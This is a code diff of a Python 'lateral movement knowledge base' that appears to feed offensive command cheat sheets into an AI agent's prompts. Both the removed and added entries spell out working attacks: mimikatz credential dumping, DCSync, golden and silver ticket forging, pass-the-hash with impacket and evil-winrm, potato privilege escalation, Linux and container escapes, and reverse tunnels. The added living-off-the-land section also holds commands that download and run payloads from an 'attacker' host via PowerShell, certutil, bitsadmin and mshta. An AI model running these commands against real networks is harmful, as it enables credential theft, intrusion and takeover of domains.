@@ -1,11 +1,11 @@
 """Lateral movement knowledge base.
 
-Deep knowledge about post-exploitation lateral movement:
-1. Windows Active Directory lateral movement
-2. Linux privilege escalation and pivoting
-3. Container escape techniques
-4. Pass-the-Hash / Pass-the-Ticket
-5. SSH pivoting and tunneling
+Deep knowledge about lateral movement techniques:
+1. Remote execution methods (WMI, WinRM, PsExec, SSH)
+2. Pass-the-hash / Pass-the-ticket
+3. Token impersonation
+4. Pivoting and tunneling
+5. Living-off-the-land binaries
 """
 
 from __future__ import annotations
@@ -23,7 +23,7 @@ class LateralPattern:
     """A lateral movement pattern."""
     pattern_id: str = ""
     name: str = ""
-    platform: str = ""
+    category: str = ""
     severity: str = "critical"
     description: str = ""
     detection_strategy: str = ""
@@ -33,190 +33,196 @@ class LateralPattern:
         return {
             "id": self.pattern_id,
             "name": self.name[:25],
-            "platform": self.platform[:10],
+            "category": self.category[:12],
         }
 
 
 LATERAL_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "lat-001", "name": "Pass-the-Hash / Pass-the-Ticket",
-        "platform": "windows", "severity": "critical",
-        "desc": "Using stolen credentials for lateral movement.",
+        "id": "lat-001", "name": "Remote Execution Methods",
+        "category": "remote_exec", "severity": "critical",
+        "desc": "Remote code execution techniques for lateral movement.",
         "detection": (
-            "PASS-THE-HASH / PASS-THE-TICKET:\n"
-            "CREDENTIAL EXTRACTION:\n"
-            "  mimikatz:\n"
-            "    privilege::debug\n"
-            "    sekurlsa::logonpasswords  # Dump plaintext + hashes\n"
-            "    sekurlsa::wdigest  # WDigest plaintext\n"
-            "    lsadump::sam  # Local SAM database\n"
-            "    lsadump::dcsync /domain:<domain> /user:krbtgt  # DCSync\n"
-            "  secretsdump.py (Impacket):\n"
-            "    secretsdump.py <domain>/<user>:<pass>@<dc_ip>\n"
-            "    secretsdump.py -hashes <lm:nt> <domain>/<user>@<dc_ip>\n"
-            "PASS-THE-HASH:\n"
-            "  # Use NTLM hash without cracking\n"
-            "  pth-winexe -U <domain>/<user>%<lm:nt> //<target> cmd\n"
-            "  psexec.py -hashes <lm:nt> <domain>/<user>@<target>\n"
-            "  wmiexec.py -hashes <lm:nt> <domain>/<user>@<target>\n"
-            "  evil-winrm -i <target> -u <user> -H <nt_hash>\n"
-            "PASS-THE-TICKET:\n"
-            "  # Extract Kerberos tickets\n"
-            "  mimikatz: sekurlsa::tickets /export\n"
+            "REMOTE EXECUTION METHODS:\n"
+            "PSEXEC:\n"
+            "  # Sysinternals PsExec\n"
+            "  psexec.py target.com/user:password@<target> cmd.exe\n"
+            "  # Requires: Admin access, SMB (445)\n"
+            "  # Creates service, uploads binary\n"
+            "WMI:\n"
+            "  # Windows Management Instrumentation\n"
+            "  wmiexec.py target.com/user:password@<target>\n"
+            "  # Semi-interactive shell via WMI\n"
+            "  # Requires: Admin access, WMI (135+dynamic)\n"
+            "WINRM:\n"
+            "  # Windows Remote Management\n"
+            "  evil-winrm -i <target> -u user -p password\n"
+            "  # PowerShell remoting\n"
+            "  # Requires: WinRM enabled (5985/5986)\n"
+            "DCOM:\n"
+            "  # Distributed COM\n"
+            "  dcomexec.py target.com/user:password@<target>\n"
+            "  # Uses MMC20, ShellWindows, ShellBrowserWindow\n"
+            "SSH:\n"
+            "  ssh user@<target>\n"
+            "  # Key-based: ssh -i key.pem user@target\n"
+            "  # Port forwarding: ssh -L 8080:internal:80 user@pivot\n"
+            "RDP:\n"
+            "  xfreerdp /v:<target> /u:user /p:password\n"
+            "  # Restricted admin: Pass-the-hash via RDP\n"
+            "SMBEXEC:\n"
+            "  smbexec.py target.com/user:password@<target>"
+        ),
+        "tools": ["impacket", "evil-winrm", "crackmapexec"],
+    },
+    {
+        "id": "lat-002", "name": "Pass-the-Hash / Ticket",
+        "category": "credential_reuse", "severity": "critical",
+        "desc": "Credential reuse techniques (PtH, PtT, overpass-the-hash).",
+        "detection": (
+            "PASS-THE-HASH / TICKET:\n"
+            "PASS-THE-HASH (PtH):\n"
+            "  # Use NTLM hash without knowing password\n"
+            "  crackmapexec smb <target> -u user -H <hash>\n"
+            "  psexec.py -hashes :<hash> user@<target>\n"
+            "  wmiexec.py -hashes :<hash> user@<target>\n"
+            "  evil-winrm -i <target> -u user -H <hash>\n"
+            "  # Requires: NTLM hash, admin or local admin\n"
+            "PASS-THE-TICKET (PtT):\n"
+            "  # Inject Kerberos ticket\n"
+            "  # Export ticket\n"
+            "  mimikatz> sekurlsa::tickets /export\n"
             "  # Inject ticket\n"
-            "  mimikatz: kerberos::ptt <ticket.kirbi>\n"
-            "  # Golden Ticket (krbtgt hash)\n"
-            "  mimikatz: kerberos::golden /user:admin /domain:<domain> /sid:<sid> /krbtgt:<hash>\n"
-            "  # Silver Ticket (service account hash)\n"
-            "  mimikatz: kerberos::golden /user:admin /domain:<domain> /sid:<sid> /target:<server> /service:<svc> /rc4:<hash>"
+            "  mimikatz> kerberos::ptt ticket.kirbi\n"
+            "  # Linux: export KRB5CCNAME=ticket.ccache\n"
+            "  impacket-getTGT -hashes :<hash> domain/user\n"
+            "  export KRB5CCNAME=user.ccache\n"
+            "  psexec.py -k -no-pass target.com/user@<target>\n"
+            "OVERPASS-THE-HASH:\n"
+            "  # Convert NTLM hash to Kerberos ticket\n"
+            "  mimikatz> sekurlsa::pth /user:admin /ntlm:<hash> /run:cmd\n"
+            "  # Then use Kerberos-based tools\n"
+            "SILVER TICKET:\n"
+            "  # Forge service ticket using service account hash\n"
+            "  mimikatz> kerberos::golden /sid:<SID> /domain:target.com "
+            "/target:<server> /service:<service> /rc4:<hash> /user:admin\n"
+            "GOLDEN TICKET:\n"
+            "  # Forge TGT using KRBTGT hash = domain-wide access\n"
+            "  mimikatz> kerberos::golden /domain:target.com /sid:<SID> "
+            "/krbtgt:<hash> /user:admin"
         ),
-        "tools": ["mimikatz", "impacket", "evil-winrm"],
+        "tools": ["mimikatz", "impacket", "crackmapexec"],
     },
     {
-        "id": "lat-002", "name": "Linux Privilege Escalation",
-        "platform": "linux", "severity": "critical",
-        "desc": "Escalating privileges on Linux systems.",
+        "id": "lat-003", "name": "Token and Session Hijacking",
+        "category": "token", "severity": "critical",
+        "desc": "Token impersonation and session hijacking.",
         "detection": (
-            "LINUX PRIVILEGE ESCALATION:\n"
-            "ENUMERATION:\n"
-            "  # Automated\n"
-            "  linpeas.sh  # Most comprehensive\n"
-            "  linux-exploit-suggester.sh\n"
-            "  pspy  # Monitor processes without root\n"
-            "SUID/SGID BINARIES:\n"
-            "  find / -perm -4000 -type f 2>/dev/null\n"
-            "  find / -perm -2000 -type f 2>/dev/null\n"
-            "  # Check GTFOBins for exploitation\n"
-            "  # Common: nmap, vim, find, bash, python, perl\n"
-            "SUDO MISCONFIGURATION:\n"
-            "  sudo -l  # List sudo permissions\n"
-            "  # Exploitable entries:\n"
-            "  (ALL) NOPASSWD: /usr/bin/vim → :!/bin/bash\n"
-            "  (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \\;\n"
-            "  (ALL) NOPASSWD: /usr/bin/python → python -c 'import os; os.system(\"/bin/sh\")'\n"
-            "CRON JOBS:\n"
-            "  cat /etc/crontab\n"
-            "  ls -la /etc/cron.d/\n"
-            "  # Writable cron scripts → inject commands\n"
-            "  # PATH manipulation in cron\n"
-            "KERNEL EXPLOITS:\n"
-            "  uname -a  # Check kernel version\n"
-            "  # DirtyPipe (CVE-2022-0847): 5.8 ≤ kernel < 5.16.11\n"
-            "  # DirtyCow (CVE-2016-5195): kernel < 4.8.3\n"
-            "CAPABILITIES:\n"
-            "  getcap -r / 2>/dev/null\n"
-            "  # cap_setuid → escalate\n"
-            "  # cap_net_raw → packet sniffing"
-        ),
-        "tools": ["linpeas", "pspy", "linux-exploit-suggester"],
-    },
-    {
-        "id": "lat-003", "name": "Container Escape",
-        "platform": "container", "severity": "critical",
-        "desc": "Breaking out of container environments.",
-        "detection": (
-            "CONTAINER ESCAPE:\n"
-            "DETECTION:\n"
-            "  # Am I in a container?\n"
-            "  cat /proc/1/cgroup | grep -i docker\n"
-            "  ls /.dockerenv\n"
-            "  hostname  # Random hex = likely container\n"
-            "PRIVILEGED CONTAINER:\n"
-            "  # Check if privileged\n"
-            "  cat /proc/self/status | grep CapEff\n"
-            "  # If 000001ffffffffff → fully privileged\n"
-            "  # Mount host filesystem\n"
-            "  mkdir /mnt/host\n"
-            "  mount /dev/sda1 /mnt/host\n"
-            "  chroot /mnt/host /bin/bash\n"
-            "  # Or use nsenter\n"
-            "  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n"
-            "DOCKER SOCKET:\n"
-            "  # Check for mounted Docker socket\n"
-            "  ls -la /var/run/docker.sock\n"
-            "  # If accessible → create privileged container\n"
-            "  docker run -v /:/host -it alpine chroot /host /bin/bash\n"
-            "KERNEL EXPLOITS:\n"
-            "  # Container shares kernel with host\n"
-            "  # DirtyPipe, DirtyCow work from inside container\n"
-            "  # CVE-2022-0185: File system context exploit\n"
-            "  # runc vulnerabilities (CVE-2024-21626)\n"
-            "PROC/SYS ESCAPE:\n"
-            "  # Release agent cgroup escape\n"
-            "  # core_pattern escape\n"
-            "  echo '|/path/to/script' > /proc/sys/kernel/core_pattern"
-        ),
-        "tools": ["deepce", "docker", "nsenter"],
-    },
-    {
-        "id": "lat-004", "name": "SSH Pivoting and Tunneling",
-        "platform": "linux", "severity": "high",
-        "desc": "Using SSH for pivoting through compromised networks.",
-        "detection": (
-            "SSH PIVOTING AND TUNNELING:\n"
-            "LOCAL PORT FORWARD:\n"
-            "  # Access internal service through compromised host\n"
-            "  ssh -L <local_port>:<internal_target>:<target_port> user@compromised\n"
-            "  # Example: Access internal web server\n"
-            "  ssh -L 8080:10.0.0.5:80 user@pivot\n"
-            "  # Then browse: http://localhost:8080\n"
-            "REMOTE PORT FORWARD:\n"
-            "  # Make attacker service accessible to internal network\n"
-            "  ssh -R <remote_port>:localhost:<local_port> user@compromised\n"
-            "DYNAMIC (SOCKS) PROXY:\n"
-            "  # Full SOCKS proxy through compromised host\n"
-            "  ssh -D 1080 user@compromised\n"
-            "  # Configure tools to use SOCKS proxy\n"
-            "  proxychains nmap -sT <internal_target>\n"
-            "  curl --socks5 localhost:1080 http://internal:8080\n"
-            "SSHUTTLE (VPN over SSH):\n"
-            "  # Route entire subnet through SSH\n"
-            "  sshuttle -r user@compromised 10.0.0.0/24\n"
-            "CHISEL (when SSH unavailable):\n"
-            "  # Server (attacker):\n"
-            "  chisel server --reverse --port 8000\n"
-            "  # Client (compromised):\n"
-            "  chisel client <attacker>:8000 R:socks\n"
-            "  # Then use SOCKS proxy at attacker:1080\n"
-            "MULTI-HOP:\n"
-            "  ssh -J user@pivot1,user@pivot2 user@target\n"
-            "  # Or ProxyJump in ~/.ssh/config"
-        ),
-        "tools": ["ssh", "chisel", "sshuttle", "proxychains"],
-    },
-    {
-        "id": "lat-005", "name": "Windows AD Domain Attacks",
-        "platform": "windows", "severity": "critical",
-        "desc": "Active Directory domain-level attacks.",
-        "detection": (
-            "ACTIVE DIRECTORY DOMAIN ATTACKS:\n"
-            "KERBEROASTING:\n"
-            "  # Request TGS for service accounts\n"
-            "  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc>\n"
-            "  # Crack offline with hashcat\n"
-            "  hashcat -m 13100 <hashes> <wordlist>\n"
-            "  # Targets service accounts with SPNs\n"
-            "AS-REP ROASTING:\n"
-            "  # Accounts with no pre-auth required\n"
-            "  GetNPUsers.py <domain>/ -dc-ip <dc> -no-pass -usersfile users.txt\n"
-            "  hashcat -m 18200 <hashes> <wordlist>\n"
-            "DCSYNC:\n"
-            "  # Replicate AD credentials (needs Replicating Directory Changes)\n"
-            "  secretsdump.py <domain>/<user>:<pass>@<dc_ip>\n"
-            "  mimikatz: lsadump::dcsync /domain:<domain> /all\n"
-            "BLOODHOUND:\n"
-            "  # Map AD attack paths\n"
-            "  bloodhound-python -c All -d <domain> -u <user> -p <pass> -dc <dc>\n"
-            "  # Import into BloodHound GUI\n"
-            "  # Find: shortest path to DA, Kerberoastable users, DCSync targets\n"
-            "DELEGATION ATTACKS:\n"
-            "  # Unconstrained delegation → capture TGTs\n"
-            "  # Constrained delegation → impersonate any user\n"
+            "TOKEN AND SESSION HIJACKING:\n"
+            "TOKEN IMPERSONATION:\n"
+            "  # Windows tokens represent user security context\n"
+            "  # SeImpersonatePrivilege required\n"
+            "  # Potato attacks (local priv esc to SYSTEM)\n"
+            "  JuicyPotato.exe -l 1337 -p cmd.exe -t *\n"
+            "  PrintSpoofer.exe -i -c cmd.exe\n"
+            "  GodPotato.exe -cmd cmd.exe\n"
+            "  # From SYSTEM, impersonate any logged-on user\n"
+            "  # Incognito (Meterpreter)\n"
+            "  load incognito\n"
+            "  list_tokens -u\n"
+            "  impersonate_token 'DOMAIN\\user'\n"
+            "KERBEROS DELEGATION:\n"
+            "  # Unconstrained delegation\n"
+            "  # Server can impersonate any user to any service\n"
+            "  # Constrained delegation\n"
+            "  # Server can impersonate users to specific services\n"
             "  # Resource-based constrained delegation (RBCD)\n"
-            "  rbcd.py <domain>/<user>:<pass> -delegate-to <target> -delegate-from <controlled>\n"
-            "  getST.py <domain>/<controlled>:<pass> -spn <service>/<target> -impersonate admin"
+            "  # Attacker controls msDS-AllowedToActOnBehalfOfOtherIdentity\n"
+            "  impacket-rbcd -delegate-to '<target>$' -delegate-from '<attacker>$' -action write 'target.com/user:pass'\n"
+            "SESSION HIJACKING:\n"
+            "  # RDP session hijacking (SYSTEM required)\n"
+            "  query user  # List sessions\n"
+            "  tscon <session_id> /dest:console  # Hijack session"
         ),
-        "tools": ["impacket", "bloodhound", "mimikatz"],
+        "tools": ["mimikatz", "impacket", "rubeus"],
+    },
+    {
+        "id": "lat-004", "name": "Pivoting and Tunneling",
+        "category": "pivot", "severity": "high",
+        "desc": "Network pivoting and tunneling techniques.",
+        "detection": (
+            "PIVOTING AND TUNNELING:\n"
+            "SSH TUNNELING:\n"
+            "  # Local port forward\n"
+            "  ssh -L 8080:internal.target:80 user@pivot\n"
+            "  # Dynamic SOCKS proxy\n"
+            "  ssh -D 1080 user@pivot\n"
+            "  proxychains nmap <internal-target>\n"
+            "  # Remote port forward (reverse)\n"
+            "  ssh -R 8080:localhost:80 user@attacker\n"
+            "CHISEL:\n"
+            "  # Server (attacker)\n"
+            "  chisel server --reverse -p 8000\n"
+            "  # Client (pivot)\n"
+            "  chisel client attacker:8000 R:socks\n"
+            "  # Then: proxychains nmap <internal>\n"
+            "LIGOLO-NG:\n"
+            "  # Server (attacker)\n"
+            "  proxy -selfcert\n"
+            "  # Client (pivot)\n"
+            "  agent -connect attacker:11601 -ignore-cert\n"
+            "  # Creates TUN interface on attacker\n"
+            "  # No SOCKS needed, direct routing\n"
+            "METASPLOIT:\n"
+            "  # autoroute\n"
+            "  run autoroute -s <internal-subnet>\n"
+            "  # socks_proxy\n"
+            "  use auxiliary/server/socks_proxy\n"
+            "  set SRVPORT 1080\n"
+            "  run\n"
+            "  # Then: proxychains <tool>\n"
+            "DOUBLE PIVOTING:\n"
+            "  # Chain: Attacker → Pivot1 → Pivot2 → Target\n"
+            "  # SSH through multiple hops\n"
+            "  ssh -J user@pivot1 user@pivot2"
+        ),
+        "tools": ["chisel", "ligolo-ng", "proxychains"],
+    },
+    {
+        "id": "lat-005", "name": "Living-off-the-Land",
+        "category": "lotl", "severity": "high",
+        "desc": "Using legitimate system tools for lateral movement.",
+        "detection": (
+            "LIVING-OFF-THE-LAND (LOL):\n"
+            "POWERSHELL:\n"
+            "  # Remote execution\n"
+            "  Invoke-Command -ComputerName <target> -ScriptBlock { whoami }\n"
+            "  Enter-PSSession -ComputerName <target>\n"
+            "  # Download and execute\n"
+            "  IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\n"
+            "  # AMSI bypass + execution\n"
+            "WMIC:\n"
+            "  wmic /node:<target> process call create 'cmd /c whoami'\n"
+            "  # Remote process execution\n"
+            "SCHTASKS:\n"
+            "  schtasks /create /s <target> /tn task /tr cmd.exe /sc once /st 00:00\n"
+            "  schtasks /run /s <target> /tn task\n"
+            "SC:\n"
+            "  sc \\\\<target> create svcname binpath= 'cmd /c whoami'\n"
+            "  sc \\\\<target> start svcname\n"
+            "BITSADMIN:\n"
+            "  bitsadmin /transfer job http://attacker/payload C:\\payload.exe\n"
+            "CERTUTIL:\n"
+            "  certutil -urlcache -split -f http://attacker/payload.exe C:\\payload.exe\n"
+            "MSHTA:\n"
+            "  mshta http://attacker/payload.hta\n"
+            "RUNDLL32:\n"
+            "  rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"\n"
+            "LOLBAS:\n"
+            "  # Full list: https://lolbas-project.github.io/\n"
+            "  # GTFOBins (Linux): https://gtfobins.github.io/"
+        ),
+        "tools": ["powershell", "certutil"],
     },
 ]
 
@@ -224,8 +230,8 @@ LATERAL_PATTERNS: list[dict[str, Any]] = [
 class LateralMovementKB:
     """Lateral movement knowledge base.
 
-    Provides post-exploitation lateral movement
-    patterns injected into agent prompts.
+    Provides lateral movement techniques
+    injected into agent prompts.
     """
 
     def __init__(self) -> None:
@@ -239,7 +245,7 @@ class LateralMovementKB:
             pattern = LateralPattern(
                 pattern_id=data["id"],
                 name=data["name"],
-                platform=data.get("platform", ""),
+                category=data.get("category", ""),
                 severity=data.get("severity", "critical"),
                 description=data.get("desc", ""),
                 detection_strategy=data.get("detection", ""),
@@ -247,37 +253,37 @@ class LateralMovementKB:
             )
             self._patterns[pattern.pattern_id] = pattern
 
-    def get_by_platform(self, platform: str) -> list[LateralPattern]:
-        """Get patterns by platform."""
+    def get_by_category(self, category: str) -> list[LateralPattern]:
+        """Get patterns by category."""
         return [
             p for p in self._patterns.values()
-            if p.platform.lower() == platform.lower()
+            if p.category.lower() == category.lower()
         ]
 
     def build_lateral_prompt(
         self,
-        platforms: list[str] | None = None,
+        categories: list[str] | None = None,
         max_patterns: int = 4,
     ) -> str:
         """Build lateral movement prompt."""
-        lines = ["## Lateral Movement Patterns\n"]
+        lines = ["## Lateral Movement Techniques\n"]
         count = 0
         for pattern in self._patterns.values():
-            if platforms and pattern.platform.lower() not in [p.lower() for p in platforms]:
+            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                 continue
             if count >= max_patterns:
                 break
-            lines.append(f"### {pattern.name} [{pattern.platform.upper()}]")
+            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
             lines.append(pattern.detection_strategy)
             lines.append("")
             count += 1
         return "\n".join(lines)
 
     def get_stats(self) -> dict[str, Any]:
-        plat_counts: dict[str, int] = {}
+        cat_counts: dict[str, int] = {}
         for p in self._patterns.values():
-            plat_counts[p.platform] = plat_counts.get(p.platform, 0) + 1
+            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
         return {
             "patterns": len(self._patterns),
-            "by_platform": plat_counts,
+            "by_category": cat_counts,
         }
